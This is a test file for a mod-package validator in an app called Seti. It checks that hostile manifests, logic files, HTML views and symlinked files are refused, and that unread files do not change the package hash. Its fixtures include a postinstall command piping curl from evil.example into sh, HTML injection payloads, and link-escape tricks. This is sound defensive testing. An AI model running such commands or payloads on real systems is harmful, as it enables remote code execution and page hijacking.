import { createHash } from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { MOD_POINTS } from '@seti/shared'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { packageHash } from './hash.js'
import { folderSource } from './read-folder.js'
import { mapReader, readPackage, type ValidPackage } from './validate.js'
import { SETI_HOME } from '../../config.js'

const BUNDLED = new Set(['weather', 'whats-new'])

const MANIFEST = {
  id: 'linear',
  name: 'Linear',
  version: '1.0.0',
  seti: '^1.1',
  description: 'Links issues',
  capabilities: [{ name: 'net.fetch', hosts: ['api.linear.app'] }, { name: 'storage' }],
}

type Files = Record<string, string | Buffer>

const asMap = (files: Files) =>
  new Map(Object.entries(files).map(([name, body]) => [name, Buffer.isBuffer(body) ? body : Buffer.from(body)]))

const pkg = (manifest: Record<string, unknown> = {}, files: Files = {}) =>
  asMap({ 'seti-mod.json': JSON.stringify({ ...MANIFEST, ...manifest }), ...files })

async function refusal(files: Map<string, Buffer>): Promise<string> {
  return readPackage(mapReader(files), BUNDLED).then(
    () => expect.fail('the package was accepted'),
    (e: unknown) => (e instanceof Error ? e.message : String(e)),
  )
}

function folder(files: Files): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mod-pkg-'))
  for (const [name, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true })
    fs.writeFileSync(path.join(dir, name), body)
  }
  return dir
}

describe('third-party manifests', () => {
  it.each([
    [{ contributes: { routes: [{ method: 'GET', path: '/x' }] } }, /Only mods bundled with Seti may add routes/],
    [{ defaultEnabled: true }, /starts off until you turn it on/],
    [{ required: true }, /Only mods bundled with Seti may be required/],
    [{ activation: ['onStartup'] }, /runs only when an event names it/],
    [{ id: 'seti' }, /The id seti is taken by Seti/],
    [{ id: 'weather' }, /The id weather is taken by Seti/],
    [{ name: 'EA' }, /The name EA belongs to Seti/],
    [{ capabilities: [{ name: 'net.fetch', hosts: ['*.github.io'] }] }, /belongs to someone else/],
  ])('refuses %j with its reason', async (extra, reason) => {
    expect(await refusal(pkg(extra))).toMatch(reason)
  })
})

describe('package files', () => {
  const logic = (source: string) => pkg({ main: 'logic.js', activation: [] }, { 'logic.js': source })

  it.each([
    ["import x from 'y'\nexport default {}", /imports y/],
    ["export * from './other.js'", /exports from another file/],
    ["export default { go: () => import('node:fs') }", /uses import/],
    ['export default {', /not valid JavaScript/],
  ])('refuses logic %j', async (source, reason) => {
    expect(await refusal(logic(source))).toMatch(reason)
  })

  it('refuses a logic bundle over 512 KB', async () => {
    expect(await refusal(logic(`export default {}\n//${'x'.repeat(513 * 1024)}`))).toMatch(/logic.js is over 512 KB/)
  })

  it('refuses a main path that leaves the package', async () => {
    expect(await refusal(pkg({ main: '../logic.js' }, {}))).toMatch(/no \. or \.\. parts|stay inside/)
  })
})

describe('view pages', () => {
  const opened = MOD_POINTS.views.thirdParty
  beforeAll(() => {
    MOD_POINTS.views.thirdParty = true
  })
  afterAll(() => {
    MOD_POINTS.views.thirdParty = opened
  })

  const view = (n: number) => ({
    id: `v${String(n)}`,
    title: `V${String(n)}`,
    where: 'section',
    phone: true,
    entry: `views/v${String(n)}.html`,
  })
  const page = (html: string) => pkg({ contributes: { views: [view(1)] } }, { 'views/v1.html': html })

  it.each([
    ['<script src="https://cdn.example/x.js"></script>', /loads a script from a file/],
    ['<button onclick="go()">Go</button>', /has an onclick attribute/],
    ['<meta http-equiv="refresh" content="0;url=https://evil.example">', /meta http-equiv/],
    ['<base href="https://evil.example/">', /has a <base>/],
    ['<link rel="preload" as="script" href="https://evil.example/x.js">', /has a <link>/],
    ['<a href=" JavaScript:alert(1)">x</a>', /javascript: URL in href/],
    ['<template><img src=x onerror="go()"></template>', /has an onerror attribute/],
  ])('refuses %j', async (html, reason) => {
    expect(await refusal(page(html))).toMatch(reason)
  })

  it('pins each inline script by its hash for the page policy', async () => {
    const valid = await readPackage(mapReader(page('<p>Hi</p><script>seti.ready()</script>')), BUNDLED)
    const expected = `sha256-${createHash('sha256').update('seti.ready()').digest('base64')}`
    expect(valid.scriptHashes).toEqual({ 'views/v1.html': [expected] })
  })

  it('refuses a package over 2 MB in total', async () => {
    const views = [1, 2, 3, 4, 5].map(view)
    const pages = Object.fromEntries(views.map((entry) => [entry.entry, `<p>${'x'.repeat(450 * 1024)}</p>`]))
    expect(await refusal(pkg({ contributes: { views } }, pages))).toMatch(/at most 2 MB/)
  })
})

describe('content hash', () => {
  it('is the same for the same files in any order, and changes with any byte', () => {
    const a = new Map([
      ['b.txt', Buffer.from('two')],
      ['a.txt', Buffer.from('one')],
    ])
    const b = new Map([...a].reverse())
    expect(packageHash(a)).toBe(packageHash(b))
    expect(packageHash(a)).toMatch(/^[a-f0-9]{64}$/)
    expect(packageHash(new Map([...a, ['a.txt', Buffer.from('One')]]))).not.toBe(packageHash(a))
  })

  it('covers only the files Seti reads, so a node_modules or package.json changes nothing', async () => {
    const plain = await readPackage(folderSource(folder({ 'seti-mod.json': JSON.stringify(MANIFEST) })).read, BUNDLED)
    const extra = folder({
      'seti-mod.json': JSON.stringify(MANIFEST),
      'package.json': JSON.stringify({ scripts: { postinstall: 'curl evil.example | sh' } }),
      'node_modules/x/index.js': 'boom',
    })
    const withExtra: ValidPackage = await readPackage(folderSource(extra).read, BUNDLED)
    expect(withExtra.hash).toBe(plain.hash)
    expect([...withExtra.files.keys()]).toEqual(['seti-mod.json'])
  })
})

describe('folder sources', () => {
  it('refuses a listed file reached through a symlink, and a hard link', async () => {
    const dir = folder({ 'seti-mod.json': JSON.stringify({ ...MANIFEST, main: 'logic.js', activation: [] }) })
    const outside = folder({ 'secret.js': 'export default {}' })
    fs.symlinkSync(path.join(outside, 'secret.js'), path.join(dir, 'logic.js'))
    expect(await readPackage(folderSource(dir).read, BUNDLED).catch((e: unknown) => String(e))).toMatch(
      /logic.js goes through a symlink/,
    )
    fs.rmSync(path.join(dir, 'logic.js'))
    fs.linkSync(path.join(outside, 'secret.js'), path.join(dir, 'logic.js'))
    expect(await readPackage(folderSource(dir).read, BUNDLED).catch((e: unknown) => String(e))).toMatch(
      /logic.js is a hard link/,
    )
  })

  it("refuses Seti's own data folder", () => {
    fs.mkdirSync(path.join(SETI_HOME, 'mods-here'), { recursive: true })
    expect(() => folderSource(path.join(SETI_HOME, 'mods-here'))).toThrow(/own data or key folders/)
  })
})
